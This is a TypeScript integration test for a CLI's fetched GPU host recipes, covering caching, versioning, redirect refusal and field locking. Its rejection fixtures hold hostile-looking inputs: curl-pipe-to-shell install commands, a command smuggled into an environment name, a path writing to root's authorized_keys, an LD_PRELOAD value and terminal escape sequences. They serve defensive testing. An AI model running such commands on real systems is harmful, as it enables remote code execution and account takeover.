import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { flagEnv } from '../../src/substrate/flagRegistry.ts'
import { HOST_RECIPES, type HostRecipe } from '../../src/services/host/recipes.ts'
import {
  HOST_RECIPES_FILE_VERSION,
  HOST_RECIPES_URL,
  SHIPPED_HOST_RECIPES_PATH,
  currentHostRecipes,
  exportHostRecipesJson,
  hostRecipeOfRecord,
  hostRecipeSchema,
  hostRecipesCachePath,
  hostRecipesFileSchema,
  loadHostRecipes,
  refreshHostRecipes,
  resetHostRecipesFetchState,
} from '../../src/services/host/recipesFile.ts'
import { repoSlugFromUrl, resolveChannelRepo } from '../../src/services/privateChannel/channelCore.ts'
import { RunpodClient } from '../../src/services/host/runpod.ts'
import { fakeSshRunner, runpodFixture } from './runpodFixture.mjs'

if (!process.env.MERCURY_CONFIG_DIR) throw new Error('A scratch MERCURY_CONFIG_DIR is required')
mkdirSync(process.env.MERCURY_CONFIG_DIR, { recursive: true })
const rootScratch = mkdtempSync(join(process.env.MERCURY_CONFIG_DIR, 'recipes-live-'))
process.env.MERCURY_LOCAL_PROBE_TARGETS = 'none'
delete process.env.MERCURY_HOST_RECIPES_FILE

let checks = 0
const check = (name: string, truth: unknown): void => {
  assert.ok(truth, name)
  checks++
  console.log('PASS ' + name)
}

const repo = join(import.meta.dir, '../..')
const freshHome = (label: string): string => {
  const dir = join(rootScratch, label)
  mkdirSync(dir, { recursive: true })
  process.env.MERCURY_CONFIG_DIR = dir
  delete process.env.MERCURY_HOME
  resetHostRecipesFetchState()
  return dir
}
const ids = (rows: readonly HostRecipe[]): string => rows.map(entry => entry.id).join(',')
const canonical = (value: unknown): string => JSON.stringify(value, (_key, item: unknown) => item && typeof item === 'object' && !Array.isArray(item) ? Object.fromEntries(Object.entries(item).sort(([a], [b]) => (a < b ? -1 : 1))) : item)
const cacheOf = (): { checkedAt: number; url: string; document?: unknown } => JSON.parse(readFileSync(hostRecipesCachePath(), 'utf8'))
const ownerOnly = (path: string): boolean => (statSync(path).mode & 0o777) === 0o600
const noTemps = (): boolean => readdirSync(dirname(hostRecipesCachePath())).every(name => !/^\.recipes\.json\..*\.tmp$/.test(name))
const row = (id: string): HostRecipe => structuredClone(HOST_RECIPES.find(entry => entry.id === id)!)
const unverifiedLast = (rows: readonly HostRecipe[]): HostRecipe[] => [...rows].sort((a, b) => Number(a.verified.by === 'unverified') - Number(b.verified.by === 'unverified'))
const shippedRows = unverifiedLast([...HOST_RECIPES].sort((a, b) => a.id.localeCompare(b.id)))
const shippedOrder = ids(shippedRows)
const sixHours = 6 * 60 * 60 * 1000

const rp = await runpodFixture()
let requests = 0
let served = { status: 200, body: '{}', type: 'application/json' }
const serve = (body: unknown, status = 200, type = 'application/json'): void => { served = { status, body: typeof body === 'string' ? body : JSON.stringify(body), type } }
const server = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch(request) {
  requests++
  if (new URL(request.url).pathname === '/moved.json') return new Response(null, { status: 302, headers: { location: '/recipes.json' } })
  return new Response(served.body, { status: served.status, headers: { 'content-type': served.type } })
} })
const serverUrl = `http://127.0.0.1:${server.port}/recipes.json`
const movedUrl = `http://127.0.0.1:${server.port}/moved.json`
const fileOf = (version: number, recipes: unknown[]): unknown => ({ version, publishedAt: '2026-10-21', recipes })
const fetchAndRead = async (file: unknown, options: { now?: number; shipped?: unknown } = {}): Promise<{ rows: HostRecipe[]; drops: string[] }> => {
  serve(file)
  await refreshHostRecipes({ url: serverUrl, forceFetch: true, now: options.now })
  const drops: string[] = []
  return { rows: currentHostRecipes({ shipped: options.shipped, onDrop: (index, reason) => drops.push(index + ':' + reason) }), drops }
}

const realFetch = globalThis.fetch
const exportScript = join(repo, 'scripts/host/export-recipes.ts')
const shippedPath = join(repo, SHIPPED_HOST_RECIPES_PATH)
let fixtureClose: (() => void) | undefined
let sshClose: (() => void) | undefined

try {
  check('shipped recipes JSON exists under assets/host/recipes.json', existsSync(shippedPath))
  const shippedRaw = readFileSync(shippedPath, 'utf8')
  const exportedRaw = exportHostRecipesJson(HOST_RECIPES)
  check('export reproduces the shipped JSON byte for byte from HOST_RECIPES', exportedRaw === shippedRaw)
  const driftedPath = join(rootScratch, 'drifted.json')
  writeFileSync(driftedPath, exportHostRecipesJson([{ ...HOST_RECIPES[0]!, diskGb: HOST_RECIPES[0]!.diskGb + 10 }, ...HOST_RECIPES.slice(1)]))
  const committedCheck = spawnSync(process.execPath, [exportScript, '--check'], { encoding: 'utf8' })
  const driftedCheck = spawnSync(process.execPath, [exportScript, '--check', '--out', driftedPath], { encoding: 'utf8' })
  const writtenPath = join(rootScratch, 'written.json')
  const written = spawnSync(process.execPath, [exportScript, '--out', writtenPath], { encoding: 'utf8' })
  check('export-recipes.ts --check exits 0 on the committed file and 1 on a drifted copy; --out writes the same bytes', committedCheck.status === 0 && driftedCheck.status === 1 && driftedCheck.stderr.includes('drifted') && written.status === 0 && readFileSync(writtenPath, 'utf8') === shippedRaw)
  const parsedShipped = hostRecipesFileSchema.parse(JSON.parse(shippedRaw))
  const sortedIds = [...parsedShipped.recipes.map(entry => entry.id)].sort((a, b) => a.localeCompare(b))
  check('shipped JSON carries the compiled version, a publishedAt date and unique ids sorted by id', parsedShipped.version === HOST_RECIPES_FILE_VERSION && /^\d{4}-\d{2}-\d{2}$/.test(parsedShipped.publishedAt) && JSON.stringify(parsedShipped.recipes.map(entry => entry.id)) === JSON.stringify(sortedIds) && new Set(sortedIds).size === sortedIds.length)
  const packaged = JSON.parse(readFileSync(join(repo, 'package.json'), 'utf8')).repository.url as string
  const slug = resolveChannelRepo(undefined, packaged).slug
  check('HOST_RECIPES_URL is the raw shipped file on the repository the update channel resolves from package.json', slug === 'Whq02/MercuryCLI' && repoSlugFromUrl(packaged) === slug && resolveChannelRepo(undefined, undefined).slug === slug && HOST_RECIPES_URL === `https://raw.githubusercontent.com/${slug}/main/${SHIPPED_HOST_RECIPES_PATH}`)

  const glmGguf = row('glm53-flash-gguf-b300')
  const nemotronGguf = row('nemotron35-super-gguf-rtx-pro-6000')
  const b200Community = row('glm53-flash-b200-community')
  const qwenRtx = row('qwen38-27b-rtx-pro-6000')
  const qwenH200 = row('qwen38-27b-h200')
  const interfaceBody = /export interface HostRecipe \{([\s\S]*?)\n\}/.exec(readFileSync(join(repo, 'src/services/host/recipes.ts'), 'utf8'))![1]!
  const interfaceFields = [...interfaceBody.matchAll(/^\s+(\w+)(\?)?:/gm)].map(match => ({ name: match[1]! as keyof HostRecipe, optional: Boolean(match[2]) }))
  const fullRow: Record<string, unknown> = { ...glmGguf, pythonInstall: 'true', environment: { HF_HUB_ENABLE_HF_TRANSFER: '1' }, files: { 'a.json': '{}' } }
  const fullParsed = hostRecipeSchema.safeParse(fullRow)
  const parity = interfaceFields.map(field => {
    const rest = { ...fullRow }
    delete rest[field.name]
    return { field: field.name, typed: !hostRecipeSchema.safeParse({ ...fullRow, [field.name]: Symbol('not a recipe value') }).success, optional: hostRecipeSchema.safeParse(rest).success === field.optional }
  })
  check('every HostRecipe field has a schema entry with the interface optionality, and the schema has no field the interface lacks', interfaceFields.length === 25 && interfaceFields.some(field => field.name === 'weightsGb' && !field.optional) && fullParsed.success && JSON.stringify(Object.keys(fullParsed.data).sort()) === JSON.stringify(interfaceFields.map(field => field.name).sort()) && parity.every(entry => entry.typed && entry.optional))
  check('effort levels and their dated template sources survive the recipe schema and exported file', HOST_RECIPES.every(entry => entry.efforts?.verified.on === '2026-10-20' && entry.efforts.verified.source.startsWith('https://')) && parsedShipped.recipes.every(entry => canonical(entry.efforts) === canonical(HOST_RECIPES.find(own => own.id === entry.id)!.efforts)))
  const extra = hostRecipeSchema.safeParse({ ...qwenRtx, futureField: 'from a newer file' })
  check('a row carrying an unknown extra field is accepted and the field is stripped', extra.success && !('futureField' in extra.data))
  check('every compiled row validates, ids are unique, every source is https and every measured row carries its date', HOST_RECIPES.every(entry => hostRecipeSchema.safeParse(entry).success) && new Set(HOST_RECIPES.map(entry => entry.id)).size === HOST_RECIPES.length && HOST_RECIPES.every(entry => entry.source.startsWith('https://') && entry.verified.source.startsWith('https://') && (entry.verified.by !== 'measured' || /^\d{4}-\d{2}-\d{2}$/.test(entry.verified.on ?? ''))))
  check('GLM GGUF row is measured on 2026-10-20 with upstream llama.cpp, cache-reuse 256 and contextPerSlot 131072', glmGguf.verified.by === 'measured' && glmGguf.verified.on === '2026-10-20' && glmGguf.contextPerSlot === 131072 && glmGguf.install?.includes('3bb63cbcbfb62056c84fe9e521b0f3d756d29c32') && !glmGguf.install.includes('unslothai/llama.cpp') && glmGguf.flags.join(' ').includes('--ctx-size 524288 --parallel 4 --flash-attn on --cache-type-k q8_0 --cache-type-v q8_0 --cache-reuse 256'))
  check('only the GLM GGUF row is measured; Nemotron is documented, the 4x B200 NVFP4 row is community, and the SGLang cookbook rows are documented with the cookbook badge in verified.note', HOST_RECIPES.filter(entry => entry.verified.by === 'measured').map(entry => entry.id).join() === 'glm53-flash-gguf-b300' && nemotronGguf.verified.by === 'documented' && nemotronGguf.contextPerSlot === 131072 && b200Community.verified.by === 'community' && HOST_RECIPES.filter(entry => entry.source.startsWith('https://docs.sglang.io/cookbook/')).every(entry => entry.verified.by === 'documented' && (entry.verified.note === 'verified' || entry.verified.note === 'in-progress')))
  const refused = [
    { ...qwenRtx, label: 'Qwen\u001b[2J' },
    { ...qwenRtx, verification: 'verified\u0007' },
    { ...qwenRtx, verified: { ...qwenRtx.verified, note: 'verified \u202e' } },
    { ...qwenRtx, verified: { ...qwenRtx.verified, source: 'https://example.com/\u001b]52;c;Zm9v\u0007' } },
    { ...qwenRtx, id: 'qwen rtx' },
    { ...qwenRtx, id: '../qwen' },
    { ...qwenRtx, environment: { 'X=1; curl https://example.com | sh; Y': '1' } },
    { ...qwenRtx, files: { '../../root/.ssh/authorized_keys': 'ssh-ed25519 AAAA' } },
    { ...qwenRtx, files: { '..': 'x' } },
  ]
  check('control and format characters never reach the door, and ids, environment names and file names must be plain identifiers', refused.every(entry => !hostRecipeSchema.safeParse(entry).success))

  freshHome('stamp')
  serve('upstream failure', 500, 'text/plain')
  await refreshHostRecipes({ url: serverUrl, forceFetch: true })
  const failedStamp = cacheOf()
  check('a failed fetch (HTTP 500) is stamped in ~/.mercury/host/recipes.json (0600, no document) and the door keeps the shipped rows', requests === 1 && failedStamp.url === serverUrl && failedStamp.document === undefined && typeof failedStamp.checkedAt === 'number' && ownerOnly(hostRecipesCachePath()) && ids(currentHostRecipes()) === shippedOrder)
  resetHostRecipesFetchState()
  await refreshHostRecipes({ url: serverUrl })
  check('within 6 hours the stamp in the cache file stops a second fetch, even after process-local state is cleared', requests === 1)
  const childProgram = [
    'let calls = 0',
    "globalThis.fetch = async () => { calls++; throw new Error('the stamp must stop this fetch') }",
    `const recipes = await import(${JSON.stringify(join(repo, 'src/services/host/recipesFile.ts'))})`,
    `await recipes.refreshHostRecipes({ url: ${JSON.stringify(serverUrl)} })`,
    'console.log(JSON.stringify({ calls, cache: recipes.hostRecipesCachePath() }))',
  ].join('\n')
  const child = spawnSync(process.execPath, ['-e', childProgram], { encoding: 'utf8', env: { ...process.env, MERCURY_LOCAL_PROBE_TARGETS: 'none' } })
  const childResult = JSON.parse(child.stdout.trim().split('\n').at(-1) || '{}') as { calls?: number; cache?: string }
  check('a new Mercury process within 6 hours reads the same stamp and makes no request', child.status === 0 && childResult.calls === 0 && childResult.cache === hostRecipesCachePath() && requests === 1)
  await refreshHostRecipes({ url: serverUrl, now: failedStamp.checkedAt + sixHours + 1000 })
  check('after 6 hours the next refresh fetches again and moves the stamp', requests === 2 && cacheOf().checkedAt === failedStamp.checkedAt + sixHours + 1000)

  freshHome('unreachable')
  const unreachable = await loadHostRecipes({ url: 'http://127.0.0.1:1/recipes.json', timeoutMs: 300, forceFetch: true })
  check('an unreachable URL falls back silently to the shipped rows and stamps the attempt without a document', ids(unreachable) === shippedOrder && cacheOf().document === undefined)

  freshHome('versions')
  const equalVersion = await fetchAndRead(fileOf(HOST_RECIPES_FILE_VERSION, [{ ...qwenRtx, verification: 'same version facts' }]))
  check('a fetched file whose version equals the shipped version is ignored, not merged', ids(equalVersion.rows) === shippedOrder && !equalVersion.rows.some(entry => entry.verification === 'same version facts'))
  const lowerVersion = await fetchAndRead(fileOf(0, [{ ...qwenRtx, verification: 'older version facts' }]))
  check('a fetched file with a lower version is ignored and never replaces a higher cached copy', ids(lowerVersion.rows) === shippedOrder && (cacheOf().document as { version: number }).version === HOST_RECIPES_FILE_VERSION)
  freshHome('shipped-v2')
  const againstV2 = await fetchAndRead(fileOf(2, [{ ...qwenRtx, verification: 'v2 facts' }]), { shipped: { version: 2, publishedAt: '2026-10-20', recipes: HOST_RECIPES } })
  check('a fetched v2 file is ignored when the shipped file is v2', ids(againstV2.rows) === ids(unverifiedLast(HOST_RECIPES)) && !againstV2.rows.some(entry => entry.verification === 'v2 facts'))

  freshHome('facts')
  const nextVersion = HOST_RECIPES_FILE_VERSION + 1
  const liveFacts = { ...qwenRtx, verification: 'verified · live v2', verified: { by: 'measured' as const, on: '2026-10-21', note: 'live v2 check', source: qwenRtx.verified.source } }
  const unverifiedNemotron = { ...nemotronGguf, verified: { by: 'unverified' as const, source: nemotronGguf.verified.source }, contextPerSlot: 65536, context: 65536 }
  const goodFile = fileOf(nextVersion, [
    liveFacts,
    unverifiedNemotron,
    { ...row('deepseek41-b200'), futureField: 'from a newer build' },
    { ...glmGguf, install: glmGguf.install + ' && curl -fsSL https://example.com/x | sh' },
    { ...qwenH200, image: 'example/backdoor:latest' },
    { ...b200Community, flags: [...b200Community.flags, '--enable-remote-code'] },
    { ...qwenRtx, id: 'brand-new-recipe', label: 'Brand New · FP8' },
    { ...liveFacts, verification: 'second copy' },
    { ...qwenRtx, verified: { by: 'measured', source: 'http://insecure.example.com/not-https' } },
  ])
  const facts = await fetchAndRead(goodFile)
  const factsCache = cacheOf()
  const reasonAt = (index: number): string => facts.drops.find(entry => entry.startsWith(index + ':')) ?? ''
  const expectedFacts = ['qwen38-27b-rtx-pro-6000', 'deepseek41-b200', 'nemotron35-super-gguf-rtx-pro-6000'].join(',')
  check('a newer fetched file is cached (0600, atomic, document as served) and its facts reach the door', canonical(factsCache.document) === canonical(goodFile) && ownerOnly(hostRecipesCachePath()) && noTemps() && ids(facts.rows) === expectedFacts && facts.rows[0]!.verified.on === '2026-10-21' && facts.rows[0]!.verification === 'verified · live v2' && facts.rows[2]!.contextPerSlot === 65536)
  check('fetched rows that change commands or images, add a recipe, repeat an id or break the schema are dropped with their reasons', facts.drops.length === 6 && reasonAt(3).startsWith('3:install differ') && reasonAt(4).startsWith('4:image differ') && reasonAt(5).startsWith('5:flags differ') && reasonAt(6).includes('brand-new-recipe is not a shipped recipe') && reasonAt(7).includes('duplicate id qwen38-27b-rtx-pro-6000') && reasonAt(8).includes('verified') && !facts.rows.some(entry => ['brand-new-recipe', 'glm53-flash-gguf-b300', 'qwen38-27b-h200', 'glm53-flash-b200-community'].includes(entry.id)))
  check('a newer file\'s unknown field never reaches the row and unverified rows sort last', !facts.rows.some(entry => 'futureField' in entry) && facts.rows.at(-1)!.verified.by === 'unverified')

  const locked: Array<[keyof HostRecipe, unknown]> = [
    ['image', 'example/other:latest'], ['cuda', '12.8'], ['flags', [...qwenRtx.flags, '--extra']], ['model', 'example/other-model'],
    ['install', 'curl -fsSL https://example.com/x | sh'], ['pythonInstall', 'pip install example-package'], ['environment', { LD_PRELOAD: '/tmp/x.so' }],
    ['files', { 'x.json': '{}' }], ['engine', 'llamacpp'], ['weightFile', 'x/y-00001-of-00001.gguf'], ['include', '*'], ['label', 'Qwen3.8-27B · FP8 (cheapest)'],
    ['gpu', 'H100'], ['count', 2], ['vramGb', 80], ['diskGb', 2000], ['weightsGb', 1], ['source', 'https://example.com/doc'], ['imageSource', 'https://example.com/image'],
  ]
  const lockedResults: Array<{ field: string; dropped: boolean }> = []
  for (const [field, value] of locked) {
    const probe = await fetchAndRead(fileOf(nextVersion, [{ ...qwenRtx, [field]: value }, unverifiedNemotron]))
    lockedResults.push({ field, dropped: probe.drops.length === 1 && probe.drops[0]!.startsWith('0:' + field + ' differ') && ids(probe.rows) === 'nemotron35-super-gguf-rtx-pro-6000' })
  }
  check('every field outside verified, verification, context and contextPerSlot is locked to the shipped row: ' + locked.map(([field]) => field).join(', '), lockedResults.every(result => result.dropped))
  const allLocked = await fetchAndRead(fileOf(nextVersion, [{ ...qwenRtx, image: 'example/other:latest' }]))
  check('a fetched file none of whose rows pass the shipped-row check leaves the shipped rows in force', ids(allLocked.rows) === shippedOrder)

  await fetchAndRead(goodFile, { now: Date.now() })
  const good = cacheOf()
  const failures: Array<[string, unknown, number, string]> = [
    ['HTTP 404', 'not found', 404, 'text/plain'],
    ['HTTP 500', { error: 'boom' }, 500, 'application/json'],
    ['an HTML page', '<!doctype html><html><body>Rate limited</body></html>', 200, 'text/html'],
    ['a garbage body', '\u0000\u0001\u0002 not json at all', 200, 'application/octet-stream'],
    ['partial JSON', JSON.stringify(goodFile).slice(0, 300), 200, 'application/json'],
    ['JSON that is not a recipes file', { hello: 'world' }, 200, 'application/json'],
    ['a recipes file without one valid row', fileOf(nextVersion + 1, [{ id: 'broken' }]), 200, 'application/json'],
    ['an older version', fileOf(HOST_RECIPES_FILE_VERSION, [liveFacts]), 200, 'application/json'],
  ]
  let stamp = good.checkedAt
  const kept: string[] = []
  for (const [name, body, status, type] of failures) {
    serve(body, status, type)
    stamp += 1000
    await refreshHostRecipes({ url: serverUrl, forceFetch: true, now: stamp })
    const after = cacheOf()
    if (canonical(after.document) === canonical(good.document) && after.checkedAt === stamp && ownerOnly(hostRecipesCachePath()) && ids(currentHostRecipes()) === expectedFacts) kept.push(name)
  }
  check('404, 500, an HTML page, garbage, partial JSON, a non-recipes JSON, a file with no valid row and an older version each leave the cached document intact and only move the stamp: ' + kept.join(', '), kept.length === failures.length && noTemps())
  stamp += 1000
  await loadHostRecipes({ url: 'http://127.0.0.1:1/recipes.json', timeoutMs: 300, forceFetch: true, now: stamp })
  check('an unreachable URL keeps the cached document too', canonical(cacheOf().document) === canonical(good.document) && ids(currentHostRecipes()) === expectedFacts)
  serve(fileOf(nextVersion + 1, [{ ...liveFacts, verification: 'served behind a redirect' }]))
  const beforeRedirect = requests
  await refreshHostRecipes({ url: movedUrl, forceFetch: true })
  check('a redirect is refused, never followed, and the cached document stays', requests === beforeRedirect + 1 && canonical(cacheOf().document) === canonical(good.document) && !currentHostRecipes().some(entry => entry.verification === 'served behind a redirect'))

  const doorOffers = await new RunpodClient(rp.key, rp.baseUrl).offers(new AbortController().signal)
  check('RunpodClient.offers() reads the trusted cached rows, carries their facts and sorts the unverified row last', doorOffers.length > 1 && doorOffers.some(offer => offer.recipe.id === 'qwen38-27b-rtx-pro-6000' && offer.recipe.verified.on === '2026-10-21') && doorOffers.at(-1)!.recipe.id === 'nemotron35-super-gguf-rtx-pro-6000' && doorOffers.at(-1)!.recipe.verified.by === 'unverified')

  freshHome('door')
  const hostUrl = new URL(HOST_RECIPES_URL)
  let productionFetches = 0
  globalThis.fetch = (async (input: string | URL | Request, init?: RequestInit) => {
    const url = new URL(input instanceof Request ? input.url : String(input))
    if (url.protocol === 'http:' && url.hostname === '127.0.0.1') return realFetch(input, init)
    assert.equal(url.href, hostUrl.href, 'the proof never reaches the network')
    productionFetches++
    return new Promise<Response>((_, reject) => init?.signal?.addEventListener('abort', () => reject(init.signal!.reason), { once: true }))
  }) as typeof fetch
  delete process.env.MERCURY_LOCAL_PROBE_TARGETS
  delete process.env.MERCURY_DISABLE_NONESSENTIAL_TRAFFIC
  try {
    const startedAt = performance.now()
    const firstOffers = await new RunpodClient(rp.key, rp.baseUrl).offers(new AbortController().signal)
    const firstMs = performance.now() - startedAt
    await new RunpodClient(rp.key, rp.baseUrl).offers(new AbortController().signal)
    check('the rent door lists offers from the shipped rows at once while the recipes fetch hangs, and starts one fetch only', firstMs < 2000 && firstOffers.length > 1 && firstOffers.every(offer => HOST_RECIPES.some(entry => entry.id === offer.recipe.id)) && productionFetches === 1 && !existsSync(hostRecipesCachePath()))
    const waitStarted = performance.now()
    await refreshHostRecipes()
    const waitedMs = performance.now() - waitStarted
    const doorStamp = cacheOf()
    check('the hanging fetch is aborted at its 5-second timeout and the attempt is stamped for the production URL', waitedMs > 3500 && waitedMs < 9000 && doorStamp.url === HOST_RECIPES_URL && doorStamp.document === undefined && ownerOnly(hostRecipesCachePath()))
    await new RunpodClient(rp.key, rp.baseUrl).offers(new AbortController().signal)
    check('the next door within 6 hours makes no request', productionFetches === 1)
  } finally {
    globalThis.fetch = realFetch
    process.env.MERCURY_LOCAL_PROBE_TARGETS = 'none'
  }

  process.env.MERCURY_HOST_RECIPES_FILE = 'registered-spelling'
  const readsRegistered = flagEnv('MERCURY_HOST_RECIPES_FILE') === 'registered-spelling'
  delete process.env.MERCURY_HOST_RECIPES_FILE
  check('MERCURY_HOST_RECIPES_FILE is registered and read through flagEnv, which refuses an unregistered spelling', readsRegistered && (() => { try { flagEnv('MERCURY_HOST_RECIPES_FILES'); return false } catch { return true } })())

  const { llmhostFixture } = await import('../providers/lib/llmhostFixture.ts')
  const f = await llmhostFixture()
  fixtureClose = f.close
  f.state.dialect = 'sglang'; f.state.window = 524288
  const { hostRunner, ensureHostKey } = await import('../../src/services/host/ssh.ts')
  const { queueHostSetup } = await import('../../src/services/host/jobs.ts')
  const { runHostJob } = await import('../../src/services/host/worker.ts')
  const { readHostRecord } = await import('../../src/services/host/store.ts')
  const { writeStoredRunpodApiKey } = await import('../../src/services/providers/providerSecrets.ts')
  const ssh = fakeSshRunner(f.baseUrl, hostRunner)
  sshClose = ssh.close
  const overridePath = join(f.home, 'operator-recipes.json')
  const overrideRow: HostRecipe = { ...qwenRtx, id: 'operator-qwen-rtx-pro-6000', label: 'Operator Qwen · FP8', flags: [...qwenRtx.flags, '--operator-proof-flag'], verified: { by: 'unverified', source: qwenRtx.verified.source } }
  writeFileSync(overridePath, JSON.stringify(fileOf(1, [overrideRow])))
  process.env.MERCURY_HOST_RECIPES_FILE = overridePath
  const overrideOffers = await new RunpodClient(rp.key, rp.baseUrl).offers(new AbortController().signal)
  check('MERCURY_HOST_RECIPES_FILE replaces the fetched, shipped and built-in rows, may add a recipe and change its commands', ids(currentHostRecipes()) === overrideRow.id && overrideOffers.length > 0 && overrideOffers.every(offer => offer.recipe.id === overrideRow.id))
  writeStoredRunpodApiKey(rp.key)
  const sshKey = await ensureHostKey(ssh.runner, new AbortController().signal)
  const pod = await new RunpodClient(rp.key, rp.baseUrl).create(overrideOffers[0]!, sshKey.publicKey, 'mercury-recipes-proof')
  const queued = queueHostSetup({ id: pod.id, name: pod.name, recipe: overrideRow.id, price: overrideOffers[0]!.price, startedAt: pod.startedAt ?? pod.createdAt, status: pod.status, sessionId: 'recipes-proof', workspace: f.home, sshKey: sshKey.path, apiBaseUrl: rp.baseUrl })
  delete process.env.MERCURY_HOST_RECIPES_FILE
  check('queueing the setup keeps the confirmed row in the pod record', canonical(readHostRecord(pod.id)?.recipeRow) === canonical(overrideRow))
  await runHostJob(pod.id, queued.generation!, { runner: ssh.runner, pauseMs: 20, timeoutMs: 5000, keepAlive: false })
  const engineCommand = (ssh.commands as Array<{ args: string[] }>).map(entry => entry.args.at(-1) ?? '').find(remote => remote.includes('nohup setsid')) ?? ''
  check('the setup job runs the confirmed operator row although its own process has no MERCURY_HOST_RECIPES_FILE', readHostRecord(pod.id)?.jobState === 'ready' && engineCommand.includes('--operator-proof-flag') && engineCommand.includes('/workspace/mercury-host/' + overrideRow.id))
  writeFileSync(overridePath, JSON.stringify(fileOf(1, [{ ...overrideRow, flags: [...qwenRtx.flags, '--operator-proof-flag-2'] }])))
  process.env.MERCURY_HOST_RECIPES_FILE = overridePath
  const resumed = queueHostSetup(readHostRecord(pod.id)!)
  delete process.env.MERCURY_HOST_RECIPES_FILE
  const resumedAgain = queueHostSetup(readHostRecord(pod.id)!)
  check('a resume takes the operator\'s edited row, and keeps the recorded row once the file is gone', Boolean(resumed.recipeRow?.flags.includes('--operator-proof-flag-2') && resumedAgain.recipeRow?.flags.includes('--operator-proof-flag-2')) && hostRecipeOfRecord(resumedAgain)?.id === overrideRow.id)
  check('a record with no kept row, or a kept row of another id, sets up with the built-in row of its recipe id', canonical(hostRecipeOfRecord({ recipe: 'qwen38-27b-h200' })) === canonical(qwenH200) && canonical(hostRecipeOfRecord({ recipe: 'qwen38-27b-h200', recipeRow: overrideRow })) === canonical(qwenH200))
  check('with no file and no cache the door rows are exactly the compiled table', canonical(currentHostRecipes()) === canonical(shippedRows))

  console.log('RECIPES LIVE GREEN — ' + checks + ' checks')
} finally {
  globalThis.fetch = realFetch
  delete process.env.MERCURY_HOST_RECIPES_FILE
  sshClose?.()
  server.stop(true)
  await rp.close()
  fixtureClose?.()
  rmSync(rootScratch, { recursive: true, force: true })
}
